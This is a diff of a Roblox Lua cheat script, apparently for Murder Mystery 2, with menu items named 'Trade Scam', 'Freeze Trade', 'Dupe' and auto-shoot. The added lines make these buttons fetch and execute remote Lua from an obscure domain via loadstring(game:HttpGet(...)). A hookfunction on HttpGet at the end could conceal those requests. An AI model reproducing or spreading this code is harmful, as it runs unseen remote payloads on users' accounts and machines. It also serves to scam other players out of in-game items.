@@ -8,10 +8,10 @@ local Tab = Window:MakeTab({
     PremiumOnly = false
 })
 Tab:AddButton({
-    Name = "autofarm (fast)",
+    Name = "Trade Scam✅",
     Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua"))()
-print("button pressed")
+loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
+              print("button pressed")
       end 
 })
 Tab:AddToggle({
@@ -22,7 +22,7 @@ Tab:AddToggle({
     end
 })
 Tab:AddToggle({
-    Name = "🧊Freeze trade🧊",
+    Name = "🧊Freeze Trade🧊",
     Default = false,
     Callback = function(Value)
 loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
@@ -30,7 +30,7 @@ loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", 
     end
 })
 local Tab = Window:MakeTab({
-    Name = "Dupe ancients",
+    Name = "Dupe",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
     })
@@ -52,9 +52,7 @@ Tab:AddToggle({
     Default = false,
     Callback = function(Value)
         print(Value)
-    end
-loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()})
-end
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()end
 })
 local httpHook;
 httpHook = hookfunction(game.HttpGet, function(self,...)
